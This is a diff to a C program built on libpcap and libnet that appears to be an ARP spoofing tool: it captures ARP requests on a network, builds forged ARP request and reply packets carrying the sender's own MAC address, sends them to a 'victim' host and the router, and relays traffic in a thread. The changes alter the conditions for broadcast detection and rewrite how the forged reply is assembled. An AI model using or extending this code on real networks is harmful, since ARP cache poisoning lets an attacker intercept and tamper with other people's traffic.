@@ -44,6 +44,11 @@ u_char router_mac[6];
 u_char router_ip[4];
 u_char victim_mac[6];
 u_char victim_ip[4];
+u_char broad_ip[4];
+
+// broadcast address define
+u_char br_f[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+u_char br_0[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
 
 struct arphdr {		// arp_header structure. Libnet don't have mac or ip address in arp header, so declare it.
 	u_int16_t htype;
@@ -203,7 +208,7 @@ void callback(u_char *useless, const struct pcap_pkthdr *pkthdr, u_char *packet)
 	
 	// very long if statement.
 	// only request packet & target mac address is broadcast & must not enter to router & must not enter to same ip & must not enter to own sending packet
-	if(ntohs(arpheader->oper) == ARPOP_REQUEST && *eth->ether_dhost == 0xff && *arpheader->tha == 0x00 && flag_check(arpheader->sha, router_mac) == 1 && *(arpheader->spa+3) != *(arpheader->tpa+3) && flag_check(arpheader->sha, my_mac) == 1) {
+	if(ntohs(arpheader->oper) == ARPOP_REQUEST && flag_check(eth->ether_dhost, br_f) != 1 && flag_check(arpheader->tha, br_0) != 1 && flag_check(arpheader->sha, router_mac) == 1 && *(arpheader->spa+3) != *(arpheader->tpa+3) && flag_check(arpheader->sha, my_mac) == 1) {
 		if(*router_ip == 0)		// save to router ip address
 			for(i = 0; i < 4; i++)
 				*(router_ip+i) = *(arpheader->tpa+i);
@@ -233,33 +238,34 @@ void callback(u_char *useless, const struct pcap_pkthdr *pkthdr, u_char *packet)
 
 		packet += size;
 		*(packet+1) = ARPOP_REQUEST;
-		packet -= size;
+		packet += sizeof(arpheader->oper);
+		for(i = 0; i < ETHER_ADDR_LEN; i++) *(packet+i) = *(br_0+i);
+		packet -= size + sizeof(arpheader->oper);
+		printf("\nSend a Request Packet to victim...\n");
+		pcap_sendpacket(pcap, packet, length);
+		printf("Request Success!!\nYour request packet is..\n");
+		print_packet(length, packet);
 	}
 
 	// it is send packet to router for router's table change
-	if(*router_mac != 0 && ntohs(arpheader->oper) == ARPOP_REQUEST) {
-		printf("\nRequest Packet Creating..\n");
-		for(i = 0; i < ETHER_ADDR_LEN; i++) *(packet+i) = *(router_mac+i);
+	if(ntohs(arpheader->oper) == ARPOP_REQUEST && flag_check(eth->ether_shost, router_mac) != 1 && flag_check(arpheader->sha, router_mac) != 1) {
+		printf("\nRouter's Broadcast Receive!!\nPacket Creating..\n");
+		sleep(1);	// After send to router's reply packet
+
+		for(i = 0; i < ETHER_ADDR_LEN; i++) {
+			*(packet+i) = *(my_mac+i);
+			swap(packet+i, packet+(i+ETHER_ADDR_LEN));
+		}
 
 		packet += size;
-
 		*(packet+1) = ARPOP_REPLY;
-
-		packet += sizeof(arpheader->oper) + sizeof(arpheader->sha);
-
-		for(i = 0; i < 4; i++) *(packet+i) = *(victim_ip+i);
-
-		packet += sizeof(arpheader->spa);
-		
-		for(i = 0; i < ETHER_ADDR_LEN; i++) *(packet+i) = *(router_mac+i);
-		
-		packet += sizeof(arpheader->tha);
-		
-		for(i = 0; i < 4; i++) *(packet+i) = *(router_ip+i);
-
-		packet += sizeof(arpheader->tpa);
+		packet += sizeof(arpheader->oper);
+		for(i = 0; i < 10; i++) {
+			if(i < ETHER_ADDR_LEN) *(packet+(i+10)) = *(my_mac+i);
+			swap(packet+i, packet+(i+10));
+		}
+		packet -= size + sizeof(arpheader->oper);
 		printf("\nPacket Creating Finished!!\nCreated Packet Sending...\n");
-		packet -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr);
 		pcap_sendpacket(pcap, packet, length);
 		printf("Created Packet Send Success!!\nYour created_packet is..\n");
 		print_packet(length, packet);
@@ -339,8 +345,8 @@ void * relay_test(void * arg) {	// thread function
 			pkt -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tha) - sizeof(arph->tpa);
 
 			printf("\nSend a packet to Router in Thread..\n");
-			print_packet(length, pkt);
 			pcap_sendpacket(pcap, pkt, length);
+			print_packet(length, pkt);
 			sleep(1);
 		}
 		
@@ -363,8 +369,8 @@ void * relay_test(void * arg) {	// thread function
 			pkt -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tha) - sizeof(arph->tpa);
 
 			printf("\nSend a packet to Router in Thread..\n");
-			print_packet(length, pkt);
 			pcap_sendpacket(pcap, pkt, length);
+			print_packet(length, pkt);
 			sleep(1);
 		}
 	}
